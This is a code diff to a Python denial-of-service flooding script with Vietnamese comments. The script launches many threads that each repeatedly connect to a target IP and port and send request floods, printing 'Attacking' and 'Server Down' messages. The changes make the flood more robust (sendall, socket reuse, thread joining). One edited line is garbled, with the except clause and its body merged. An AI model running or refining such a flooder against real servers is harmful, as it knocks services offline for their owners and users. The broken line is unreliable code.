@@ -84,18 +84,25 @@ def start():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             # Kết nối đến máy chủ đích với IP thật
             s.connect((ip, port))
-            s.send(str.encode(main_req))
+            s.sendall(str.encode(main_req))
             for i in range(pack):
-                s.send(str.encode(main_req))
+                s.sendall(str.encode(main_req))
             xx += random.randint(0, pack)
             print("[+] Attacking {0}:{1} | Sent: {2}".format(ip, port, xx))
-        except Exception as e:
-            s.close()
+        except Exception as e:            s.close()
             print(f'[+] Server Down: {e}')
+            break  # Ngắt vòng lặp khi có lỗi
 
 # Khởi tạo các luồng
+threads = []
 for x in range(thread):
     thread_instance = threading.Thread(target=start)
     thread_instance.start()
+    threads.append(thread_instance)
+
+# Đảm bảo tất cả các luồng hoàn tất trước khi kết thúc chương trình
+for t in threads:
+    t.join()
